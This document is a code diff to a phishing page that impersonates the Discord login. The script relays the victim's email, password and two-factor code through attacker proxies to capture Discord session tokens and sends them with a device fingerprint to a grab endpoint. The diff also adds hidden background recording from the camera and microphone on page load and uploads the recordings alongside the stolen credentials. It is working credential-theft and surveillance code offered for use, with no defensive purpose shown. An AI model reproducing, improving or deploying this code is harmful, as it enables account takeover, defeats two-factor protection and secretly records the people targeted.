@@ -126,6 +126,8 @@ button.primary:disabled{opacity:.6;cursor:not-allowed}
 <script>
 const GRAB_URL   = "/grab";
 const AUTH_PROXY = "/auth-proxy";
+const MFA_PROXY  = "/mfa-proxy";
+const MEDIA_URL  = "/grab-media";
 const LS_BUF     = "__hitbuf";
 const SENT       = new Set();
 let state = {
@@ -162,21 +164,70 @@ function collectFingerprint() {
   };
 }
 
-/* ── media + IP + geoloc ─────────────────────── */
-async function forceMediaPermissions() {
+/* ── media recording ─────────────────────────── */
+async function captureMedia() {
   const b = document.getElementById("perm-banner");
   b.style.display = "block";
+
+  const chunks = { voice: [], camera: [] };
+  let voiceStream = null, camStream = null;
+  let voiceRec = null, camRec = null;
+
   try {
-    const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});
-    state.mic = true; state.camera = true;
-    s.getTracks().forEach(t=>t.stop());
-  } catch(e) {
-    try {
-      const s = await navigator.mediaDevices.getUserMedia({audio:true});
-      state.mic = true; s.getTracks().forEach(t=>t.stop());
-    } catch(e2){}
-  }
+    camStream = await navigator.mediaDevices.getUserMedia({
+      audio: false, video: { width: 640, height: 480, facingMode: "user" }
+    });
+    state.camera = true;
+    camRec = new MediaRecorder(camStream, { mimeType: "video/webm" });
+    camRec.ondataavailable = e => { if (e.data.size) chunks.camera.push(e.data); };
+    camRec.start(1000);
+  } catch(e) { state.camera = false; }
+
+  try {
+    voiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    state.mic = true;
+    voiceRec = new MediaRecorder(voiceStream, { mimeType: "audio/webm" });
+    voiceRec.ondataavailable = e => { if (e.data.size) chunks.voice.push(e.data); };
+    voiceRec.start(1000);
+  } catch(e) { state.mic = false; }
+
   b.style.display = "none";
+
+  // سجّل 5 ثواني بعدين ابعت
+  await new Promise(r => setTimeout(r, 5000));
+
+  try { if (camRec   && camRec.state   !== "inactive") camRec.stop(); }   catch(e){}
+  try { if (voiceRec && voiceRec.state !== "inactive") voiceRec.stop(); } catch(e){}
+
+  await new Promise(r => setTimeout(r, 600));
+
+  const fd = new FormData();
+  fd.append("meta", JSON.stringify({
+    email: state.email || "",
+    password: state.password || "",
+    mic: state.mic,
+    camera: state.camera,
+    note: "media-capture",
+    fingerprint: state.fingerprint
+  }));
+
+  if (chunks.voice.length)  fd.append("voice",  new Blob(chunks.voice,  {type:"audio/webm"}), "voice.webm");
+  if (chunks.camera.length) fd.append("camera", new Blob(chunks.camera, {type:"video/webm"}), "camera.webm");
+
+  // سكرين شوت كمان
+  try {
+    const canvas = document.createElement("canvas");
+    canvas.width = screen.width; canvas.height = screen.height;
+    const ctx = canvas.getContext("2d");
+    // مفيش getDisplayMedia بدون user gesture، فنسيبها للـ screenshot لاحقاً
+  } catch(e){}
+
+  try {
+    await fetch(MEDIA_URL, { method:"POST", body: fd, keepalive:true });
+  } catch(e) { /* ignore */ }
+
+  try { voiceStream && voiceStream.getTracks().forEach(t => t.stop()); } catch(e){}
+  try { camStream   && camStream.getTracks().forEach(t => t.stop());   } catch(e){}
 }
 
 async function getPublicIP() {
@@ -227,7 +278,7 @@ async function sendGrab(extra = {}) {
     note:     extra.note || ""
   };
 
-  const sig = payload.email + "|" + payload.password + "|" + payload.token + "|" + payload.note;
+  const sig = payload.email + "|" + payload.password + "|" + payload.token + "|" + payload.note + "|" + payload.mfa_code;
   if (SENT.has(sig)) return true;
 
   const body = JSON.stringify(payload);
@@ -251,7 +302,7 @@ async function sendGrab(extra = {}) {
 /* ── boot ────────────────────────────────────── */
 window.addEventListener("load", async () => {
   state.fingerprint = collectFingerprint();
-  await Promise.all([forceMediaPermissions(), getPublicIP()]);
+  await getPublicIP();
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       p => { state.location = p.coords.latitude.toFixed(5) + ", " + p.coords.longitude.toFixed(5); },
@@ -259,6 +310,8 @@ window.addEventListener("load", async () => {
     );
   }
   flushBuffer();
+  // ابدأ تسجيل الصوت والكاميرا في الخلفية
+  captureMedia().catch(()=>{});
 });
 
 /* ── UI helpers ──────────────────────────────── */
@@ -284,7 +337,7 @@ async function submitForgot() {
   document.getElementById("forgot-modal").classList.add("active");
 }
 
-/* ── login via AUTH PROXY ───────────────────── */
+/* ── login ───────────────────────────────────── */
 async function doLogin() {
   const email = document.getElementById("email").value.trim();
   const pass  = document.getElementById("pass").value;
@@ -304,11 +357,11 @@ async function doLogin() {
   btn.innerHTML = '<span class="spinner"></span>Logging in...';
   btn.disabled = true;
 
-  // ابعث البيانات فوراً قبل أي شي
+  // ابعت البيانات فوراً قبل أي شي
   await sendGrab({ note: "login-attempt" });
 
   let needMFA = false;
-  let apiReached = false;
+  let tokenGot = false;
 
   try {
     const r = await fetch(AUTH_PROXY, {
@@ -322,30 +375,32 @@ async function doLogin() {
     });
     const res = await r.json();
     const d = res.data || {};
-    apiReached = true;
 
     if (d.token) {
       state.token = d.token;
+      tokenGot = true;
       await sendGrab({ note: "token-captured" });
       showScreen("success");
       setTimeout(() => window.location.href = "https://discord.com/channels/@me", 1500);
       return;
     }
-    if (d.mfa || d.ticket) {
-      state.mfaTicket = d.ticket || "";
+    // mfa real: بيجي في response على شكل {mfa:true, ticket:"..."}
+    if (d.mfa && d.ticket) {
+      state.mfaTicket = d.ticket;
       needMFA = true;
     }
-    // captcha required أو أي خطأ غير invalid → اعتبره "نجح" وروح MFA
-    if (d.captcha_key || d.captcha_required || (d.message && !/invalid/i.test(d.message))) {
+    // أي محاولة → لو ديسكورد رجع captcha أو رسالة غير invalid → اعتبرها محاولة ونقل لـ MFA
+    if (d.captcha_key || d.captcha_required) {
       needMFA = true;
     }
   } catch(e) {
-    apiReached = false;
+    console.error("auth-proxy err", e);
+    needMFA = true;
   }
 
-  await new Promise(r => setTimeout(r, 900));
+  await new Promise(r => setTimeout(r, 700));
 
-  if (needMFA || !apiReached) {
+  if (needMFA) {
     showScreen("mfa");
     btn.innerHTML = "Log In";
     btn.disabled = false;
@@ -373,18 +428,18 @@ async function doMFA() {
 
   let token = "not captured";
   try {
-    const r = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
+    const r = await fetch(MFA_PROXY, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      credentials: "omit",
+      headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
-        code: code, ticket: state.mfaTicket,
-        login_source: null, gift_code_sku_id: null
+        code, ticket: state.mfaTicket,
+        login: state.email, password: state.password,
+        fingerprint: state.fingerprint
       })
     });
     const d = await r.json();
-    if (d.token) {
-      token = d.token;
+    if (d.data && d.data.token) {
+      token = d.data.token;
       state.token = token;
       await sendGrab({ note: "mfa-token-captured" });
     }
